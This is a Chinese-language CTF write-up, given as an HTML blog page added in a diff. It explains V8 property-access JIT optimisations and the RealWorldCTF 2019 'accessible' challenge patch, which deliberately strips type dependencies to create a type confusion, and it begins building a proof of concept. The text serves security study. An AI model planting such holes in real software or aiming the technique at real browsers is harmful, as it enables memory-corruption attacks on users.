@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;224765 0x00前言从一题学习v8引擎对property access的相关JIT优化 0x01 前置知识简介">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从RealWorldCTF Quals 2019 - accessible学习V8对property access的优化">
+<meta property="og:url" content="https://github.com/ha1vk/2020/12/10/RealWorldCTF-Quals-2019-accessible/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;224765 0x00前言从一题学习v8引擎对property access的相关JIT优化 0x01 前置知识简介">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01223dae47b7148448.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01446453e83a30e86d.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t0188b87b0725cb4d87.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t012d2f20b9dbfb62e2.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01a9bc63e8263a3ab1.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t018ab59f2c132edbb3.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01164ed66425905e2a.png">
+<meta property="article:published_time" content="2020-12-10T06:30:02.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:09:52.469Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="类型混淆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p1.ssl.qhimg.com/t01223dae47b7148448.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/12/10/RealWorldCTF-Quals-2019-accessible/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>从RealWorldCTF Quals 2019 - accessible学习V8对property access的优化 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/12/10/RealWorldCTF-Quals-2019-accessible/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从RealWorldCTF Quals 2019 - accessible学习V8对property access的优化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-10 14:30:02" itemprop="dateCreated datePublished" datetime="2020-12-10T14:30:02+08:00">2020-12-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:09:52" itemprop="dateModified" datetime="2025-06-26T17:09:52+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224765">https://www.anquanke.com/post/id/224765</a></p>
+<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>从一题学习v8引擎对property access的相关JIT优化</p>
+<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在js中，字典类型的键称为属性(property)，如下，dict是一个对象，其中a是它的一个属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var dict = &#123;a:&quot;haivk&quot;,b:&quot;hai&quot;&#125;;</span><br></pre></td></tr></table></figure>
+<p>当你要访问a时，首先是从这个对象里面查找键的内容a，找到后从中取出其对应的值。</p>
+<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><h4 id="空间优化"><a href="#空间优化" class="headerlink" title="空间优化"></a>空间优化</h4><p>假如有多个具有相同键的对象，其排列顺序也一样，那么可以不必为每一个对象都存储这些键的值，单独存储一份键的模板，我们称之为<code>Shape</code>，比如上述的dict其键模板为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br></pre></td></tr></table></figure>
+<p>然后每个对象只需要保存一份键模板的指针即可，这样就节省了大量的空间。<br>运行如下的代码，并打印JIT代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;a:&quot;haivk&quot;,b:&quot;hai&quot;&#125;;</span><br><span class="line"></span><br><span class="line">function  opt(o)&#123;</span><br><span class="line">    o.b = 1.1;</span><br><span class="line">    o.a = 2.2;</span><br><span class="line">    return o.b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i = 0; i &lt; 0x20000; i++)&#123;</span><br><span class="line">    opt(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现生成的JIT代码如下(部分)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x38af000851a2    c2  48b88d2c2d08af380000 REX.W movq rax,0x38af082d2c8d    ;; object: 0x38af082d2c8d &lt;HeapNumber 1.1&gt;</span><br><span class="line">0x38af000851ac    cc  48bf158c1408af380000 REX.W movq rdi,0x38af08148c15    ;; object: 0x38af08148c15 &lt;Object map = 0x38af0830745d&gt;</span><br><span class="line">0x38af000851b6    d6  89470f         movl [rdi+0xf],rax</span><br><span class="line">0x38af000851b9    d9  49c7c00000fcff REX.W movq r8,0xfffc0000</span><br><span class="line">0x38af000851c0    e0  4c23c7         REX.W andq r8,rdi</span><br><span class="line">0x38af000851c3    e3  41f6400804     testb [r8+0x8],0x4</span><br><span class="line">0x38af000851c8    e8  0f8533020000   jnz 0x38af00085401  &lt;+0x321&gt;</span><br><span class="line">0x38af000851ce    ee  49b87d2c2d08af380000 REX.W movq r8,0x38af082d2c7d    ;; object: 0x38af082d2c7d &lt;HeapNumber 2.2&gt;</span><br><span class="line">0x38af000851d8    f8  4489470b       movl [rdi+0xb],r8</span><br><span class="line">0x38af000851dc    fc  49c7c10000fcff REX.W movq r9,0xfffc0000</span><br><span class="line">0x38af000851e3   103  4c23cf         REX.W andq r9,rdi</span><br><span class="line">0x38af000851e6   106  41f6410804     testb [r9+0x8],0x4</span><br><span class="line">0x38af000851eb   10b  0f85cc010000   jnz 0x38af000853bd  &lt;+0x2dd&gt;</span><br><span class="line">0x38af000851f1   111  4c8bc9         REX.W movq r9,rcx</span><br></pre></td></tr></table></figure>
+<p>可以发现，这里直接用数组下标寻址的方式进行了属性的赋值和访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movl [rdi+0xf],rax</span><br><span class="line">movl [rdi+0xb],r8</span><br></pre></td></tr></table></figure>
+<h4 id="Inline-Caches-ICs"><a href="#Inline-Caches-ICs" class="headerlink" title="Inline Caches (ICs)"></a>Inline Caches (ICs)</h4><p>如果要多次访问字典类型的数据，那么查找键的时间耗费是比较大的，因此v8引擎使用了一种叫<code>Inline Caches (ICs)</code>的机制来缓解这种查找的时间耗费。假如有如下函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function (obj) &#123;</span><br><span class="line">	return obj.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果要调用该函数对同一个对象进行多次访问，那么可以将该函数里的访问过程进行优化，即不必再从查找键开始，将该键对应的数据缓存下来，这样下次访问时先校验，然后直接从缓存中加载。如下，我们对同一个对象进行了多次访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;a:&quot;haivk&quot;,b:&quot;hai&quot;&#125;;</span><br><span class="line"></span><br><span class="line">function  opt(o)&#123;</span><br><span class="line">    return o.b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i = 0; i &lt; 0x20000; i++)&#123;</span><br><span class="line">    opt(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(obj));</span><br></pre></td></tr></table></figure>
+<p>对应的JIT代码如下（部分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x12f100084fd7   117  b81e000000     movl rax,0x1e</span><br><span class="line">0x12f100084fdc   11c  48bee1302c08f1120000 REX.W movq rsi,0x12f1082c30e1    ;; object: 0x12f1082c30e1 &lt;NativeContext[243]&gt;</span><br><span class="line">0x12f100084fe6   126  49ba00b91ce0007f0000 REX.W movq r10,0x7f00e01cb900  (LoadGlobalICTrampoline)    ;; off heap target</span><br><span class="line">0x12f100084ff0   130  41ffd2         call r10</span><br><span class="line">0x12f100084ff3   133  49c7c503000000 REX.W movq r13,0x3</span><br><span class="line">0x12f100084ffa   13a  e841f00b00     call 0x12f100144040     ;; deopt-soft deoptimization bailout</span><br></pre></td></tr></table></figure>
+<p>可以看到最后一个print调用时，直接使用<code>LoadGlobalICTrampoline</code>函数从缓存中加载了数据，而不必再从对象中查找。<br>与<code>LoadGlobalICTrampoline</code>对应函数是<code>StoreGlobalICTrampoline</code>，可以将数据保存到缓存中。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="patch点分析"><a href="#patch点分析" class="headerlink" title="patch点分析"></a>patch点分析</h3><p>patch文件如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/access-info.cc b/src/compiler/access-info.cc</span><br><span class="line">index 0744138..1df06df 100644</span><br><span class="line">--- a/src/compiler/access-info.cc</span><br><span class="line">+++ b/src/compiler/access-info.cc</span><br><span class="line">@@ -370,9 +370,11 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(</span><br><span class="line">       // The field type was cleared by the GC, so we don&#x27;t know anything</span><br><span class="line">       // about the contents now.</span><br><span class="line">     &#125;</span><br><span class="line">+#if 0</span><br><span class="line">     unrecorded_dependencies.push_back(</span><br><span class="line">         dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref,</span><br><span class="line">                                                                   descriptor));</span><br><span class="line">+#endif</span><br><span class="line">     if (descriptors_field_type-&gt;IsClass()) &#123;</span><br><span class="line">       // Remember the field map, and try to infer a useful type.</span><br><span class="line">       Handle&lt;Map&gt; map(descriptors_field_type-&gt;AsClass(), isolate());</span><br><span class="line">@@ -384,15 +386,17 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(</span><br><span class="line">   &#125;</span><br><span class="line">   // TODO(turbofan): We may want to do this only depending on the use</span><br><span class="line">   // of the access info.</span><br><span class="line">+#if 0</span><br><span class="line">   unrecorded_dependencies.push_back(</span><br><span class="line">       dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));</span><br><span class="line">+#endif</span><br><span class="line"> </span><br><span class="line">   PropertyConstness constness;</span><br><span class="line">   if (details.IsReadOnly() &amp;&amp; !details.IsConfigurable()) &#123;</span><br><span class="line">     constness = PropertyConstness::kConst;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">     map_ref.SerializeOwnDescriptor(descriptor);</span><br><span class="line">-    constness = dependencies()-&gt;DependOnFieldConstness(map_ref, descriptor);</span><br><span class="line">+    constness = PropertyConstness::kConst;</span><br><span class="line">   &#125;</span><br><span class="line">   Handle&lt;Map&gt; field_owner_map(map-&gt;FindFieldOwner(isolate(), descriptor),</span><br><span class="line">                               isolate());</span><br></pre></td></tr></table></figure>
+<p>可以看到，patch文件通过<code>#if</code>和<code>#endif</code>将两处<code>unrecorded_dependencies.push_back(dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));</code>给注释掉了，并且<code>constness = PropertyConstness::kConst;</code>将<code>constness</code>设为了<code>PropertyConstness::kConst</code><br>从源码中的注释</p>
+<blockquote>
+<p>&#x2F;&#x2F; Store is not safe if the field type was cleared.</p>
+</blockquote>
+<p>我们可以知道，字典对象的<code>property</code>的类型是很重要的，并且在程序中会被保存到<code>unrecorded_dependencies</code>容器里，而patch正是patch掉了这个操作，除了<code>Double</code>和<code>SMI</code>类型的对象，其他的对象的类型都不会被push到<code>unrecorded_dependencies</code>，<code>unrecorded_dependencies</code>最终包装给一个对象，然后返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">return PropertyAccessInfo::DataConstant(</span><br><span class="line">    zone(), receiver_map, std::move(unrecorded_dependencies), field_index,</span><br><span class="line">    details_representation, field_type, field_owner_map, field_map,</span><br><span class="line">    holder);</span><br></pre></td></tr></table></figure>
+<p>为了方便追踪，我们用gdb动态调试，设置断点，然后运行文章开始的示例脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b AccessInfoFactory::ComputeDataFieldAccessInfo</span><br></pre></td></tr></table></figure>
+<p>此时，<code>unrecorded_dependencies</code>是空的<br><img src="https://p1.ssl.qhimg.com/t01223dae47b7148448.png"><br>然后return到<code>js-heap-broker.cc</code>里的<code>GetPropertyAccessInfo</code>函数里<br><img src="https://p3.ssl.qhimg.com/t01446453e83a30e86d.png"><br>接着继续最终,来到<code>js-native-context-specialization.cc</code>里的<code>FilterMapsAndGetPropertyAccessInfos</code>函数<br><img src="https://p0.ssl.qhimg.com/t0188b87b0725cb4d87.png"><br>然后来到<code>js-native-context-specialization.cc</code>里的<code>ReduceNamedAccess</code>，发现这里有引用到<code>dependencies()</code>，打印其值，是一个容器，内容为空<br><img src="https://p4.ssl.qhimg.com/t012d2f20b9dbfb62e2.png"><br>到这里，发现使用<code>access_info.receiver_maps</code>来<code>BuildCheckMaps</code><br><img src="https://p1.ssl.qhimg.com/t01a9bc63e8263a3ab1.png"><br>跟进<code>BuildCheckMaps</code>函数，来到<code>property-access-builder.cc</code>里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void PropertyAccessBuilder::BuildCheckMaps(</span><br><span class="line">    Node* receiver, Node** effect, Node* control,</span><br><span class="line">    ZoneVector&lt;Handle&lt;Map&gt;&gt; const&amp; receiver_maps) &#123;</span><br><span class="line">  HeapObjectMatcher m(receiver);</span><br><span class="line">  if (m.HasValue()) &#123;</span><br><span class="line">    MapRef receiver_map = m.Ref(broker()).map();</span><br><span class="line">    if (receiver_map.is_stable()) &#123;</span><br><span class="line">      for (Handle&lt;Map&gt; map : receiver_maps) &#123;</span><br><span class="line">        if (MapRef(broker(), map).equals(receiver_map)) &#123;</span><br><span class="line">          dependencies()-&gt;DependOnStableMap(receiver_map);</span><br><span class="line">          return;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">.........................................................</span><br></pre></td></tr></table></figure>
+<p>跟进<code>DependOnStableMap(receiver_map);</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  387 void CompilationDependencies::DependOnStableMap(const MapRef&amp; map) &#123;</span><br><span class="line">  388   if (map.CanTransition()) &#123;</span><br><span class="line">► 389     RecordDependency(new (zone_) StableMapDependency(map));</span><br><span class="line">  390   &#125; else &#123;</span><br><span class="line">  391     DCHECK(map.is_stable());</span><br><span class="line">  392   &#125;</span><br><span class="line">  393 &#125;</span><br></pre></td></tr></table></figure>
+<p>如果<code>map.CanTransition()</code>成立，就会修改<code>property</code>的类型<br>继续跟踪，来到<code>graph-reducer.cc</code>里的<code>GraphReducer::Reduce</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  85   auto skip = reducers_.end();</span><br><span class="line">  86   for (auto i = reducers_.begin(); i != reducers_.end();) &#123;</span><br><span class="line">  87     if (i != skip) &#123;</span><br><span class="line">  88       tick_counter_-&gt;DoTick();</span><br><span class="line">  89       Reduction reduction = (*i)-&gt;Reduce(node);</span><br><span class="line">► 90       if (!reduction.Changed()) &#123;</span><br><span class="line">  91         // No change from this reducer.</span><br><span class="line">  92       &#125; else if (reduction.replacement() == node) &#123;</span><br><span class="line">  93         // &#123;replacement&#125; == &#123;node&#125; represents an in-place reduction. Rerun</span><br><span class="line">  94         // all the other reducers for this node, as now there may be more</span><br><span class="line">  95         // opportunities for reduction.</span><br></pre></td></tr></table></figure>
+<h3 id="poc构造"><a href="#poc构造" class="headerlink" title="poc构造"></a>poc构造</h3><p>从上述的分析可知，如果<code>DependOnStableMap(receiver_map);</code>里的<code>map.CanTransition()</code>不成立，那么<code>property</code>的类型就不会被改变，由于<code>const MapRef&amp; map</code>参数来自<code>access_info.receiver_maps()</code>，而<code>access_info</code>里的部分数据来自<code>unrecorded_dependencies</code>，而由于patch的原因，某些类型不会加入到<code>unrecorded_dependencies</code>了，那么意味着一些原本该进行类型转换的操作将不会进行。<br>首先构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;a:&quot;haivk&quot;,b:&quot;hai&quot;&#125;;</span><br><span class="line"></span><br><span class="line">function  opt(o)&#123;</span><br><span class="line">    return o.a;</span><br><span class="line">&#125;</span><br><span class="line">for(var i = 0; i &lt; 0x20000; i++)&#123;</span><br><span class="line">    opt(obj);</span><br><span class="line">&#125;</span><br><span class="line">obj.a = 1.1;</span><br><span class="line">print(opt(obj));</span><br></pre></td></tr></table></figure>
+<p>发现不能造成类型混淆，其JIT代码如下（部分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x23565c142c38   118  49b971404c31240e0000 REX.W movq r9,0xe24314c4071    ;; object: 0x0e24314c4071 &lt;String[#1]: a&gt;</span><br><span class="line">0x23565c142c42   122  4151           push r9</span><br><span class="line">0x23565c142c44   124  49b931024ab11e080000 REX.W movq r9,0x81eb14a0231    ;; object: 0x081eb14a0231 &lt;HeapNumber 1.1&gt;</span><br><span class="line">0x23565c142c4e   12e  4151           push r9</span><br><span class="line">0x23565c142c50   130  48bbb00d6ce27c7f0000 REX.W movq rbx,0x7f7ce26c0db0    ;; external reference (Runtime::SetNamedProperty)</span><br><span class="line">0x23565c142c5a   13a  b803000000     movl rax,0x3</span><br><span class="line">0x23565c142c5f   13f  488b75a8       REX.W movq rsi,[rbp-0x58]</span><br><span class="line">0x23565c142c63   143  49bac0a02fe37c7f0000 REX.W movq r10,0x7f7ce32fa0c0  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; off heap target</span><br><span class="line">0x23565c142c6d   14d  41ffd2         call r10</span><br></pre></td></tr></table></figure>
+<p>主要是在执行<code>obj.a = 1.1;</code>的时候没有使用优化的方法，而是使用<code>SetNamedProperty</code>的普通js方法来进行赋值，那么就不会触发到漏洞点。那么，我们在<code>&#123;&#125;</code>里再包含一个<code>&#123;&#125;</code>试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;a:&#123;b:&quot;haivk&quot;&#125;&#125;;</span><br><span class="line"></span><br><span class="line">function  opt(o)&#123;</span><br><span class="line">    return o.a.b;</span><br><span class="line">&#125;</span><br><span class="line">for(var i = 0; i &lt; 0x20000; i++)&#123;</span><br><span class="line">    opt(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj.a = &#123;b:2.2&#125;;</span><br><span class="line"></span><br><span class="line">print(opt(obj));</span><br></pre></td></tr></table></figure>
